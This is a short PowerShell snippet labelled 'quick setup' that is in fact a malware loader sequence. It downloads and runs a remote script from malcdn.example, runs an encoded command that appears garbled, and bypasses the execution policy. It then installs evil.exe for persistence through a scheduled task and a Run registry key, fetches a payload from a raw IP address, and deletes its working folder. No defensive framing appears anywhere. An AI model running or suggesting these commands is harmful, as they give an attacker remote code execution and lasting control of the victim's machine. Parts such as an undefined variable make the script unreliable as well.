# quick setup
iwr https://malcdn.example/setup.ps1 | iex
Invoke-Expression $blob
powershell -enc SQBFAFgAIAAtAE8AeABpAHMAIAAtAE4AbwBPAGUAYgB1AGkA
Set-ExecutionPolicy Bypass -Scope Process
schtasks /create /tn "updater" /tr "C:\temp\evil.exe"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "svc" -Value "C:\temp\evil.exe"
$wc = New-Object System.Net.WebClient
$wc.DownloadString("http://185.220.101.9/p")
Remove-Item -Recurse -Force C:\temp
